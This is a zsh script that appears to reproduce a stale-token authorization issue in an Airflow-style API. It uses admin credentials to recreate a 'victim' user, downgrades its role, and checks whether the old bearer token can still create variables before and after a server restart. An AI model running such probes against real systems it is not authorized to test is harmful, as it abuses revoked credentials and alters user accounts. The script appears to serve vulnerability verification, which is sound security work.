#!/bin/zsh
set -u
H=$1
tk() { curl -s -X POST $H/auth/token -H 'Content-Type: application/json' -d "{\"username\":\"$1\",\"password\":\"$2\"}" | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token',''))"; }
post() { curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: Bearer $1" -H 'Content-Type: application/json' $H/api/v2/variables -d "{\"key\":\"$2\",\"value\":\"1\",\"description\":\"\"}"; }
AT=$(tk admin adminpass)
curl -s -o /dev/null -X DELETE -H "Authorization: Bearer $AT" $H/auth/fab/v1/users/victim
curl -s -o /dev/null -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' $H/auth/fab/v1/users \
  -d '{"username":"victim","password":"victimpass","email":"v@x.com","first_name":"v","last_name":"v","roles":[{"name":"Op"}]}'
VT=$(tk victim victimpass)
print -r -- "01 source   stale-token POST variables (role Op)          : $(post $VT s1_$RANDOM)"
print -r -- "02 transition PATCH users/victim roles=[Viewer]           : $(curl -s -o /dev/null -w '%{http_code}' -X PATCH -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' $H/auth/fab/v1/users/victim -d '{"roles":[{"name":"Viewer"}]}')"
print -r -- "03 roles after transition                                 : $(curl -s -H "Authorization: Bearer $AT" $H/auth/fab/v1/users/victim | python3 -c "import json,sys;d=json.load(sys.stdin);print([r['name'] for r in d.get('roles') or []],'active=',d.get('active'))")"
print -r -- "04 follow-up stale-token POST variables                   : $(post $VT f1_$RANDOM)"
NT=$(tk victim victimpass)
print -r -- "05 D1 fresh-token POST variables                          : $(post $NT n1_$RANDOM)"
print -r -- "-- restart api-server process --"
docker restart $2 >/dev/null; sleep 40
until curl -s -o /dev/null $H/api/v2/version; do sleep 5; done
print -r -- "06 follow-up stale-token POST variables (after restart)   : $(post $VT f2_$RANDOM)"
NT2=$(tk victim victimpass)
print -r -- "07 D1 fresh-token POST variables (after restart)          : $(post $NT2 n2_$RANDOM)"
print -r -- "08 roles now                                              : $(curl -s -H "Authorization: Bearer $(tk admin adminpass)" $H/auth/fab/v1/users/victim | python3 -c "import json,sys;d=json.load(sys.stdin);print([r['name'] for r in d.get('roles') or []])")"
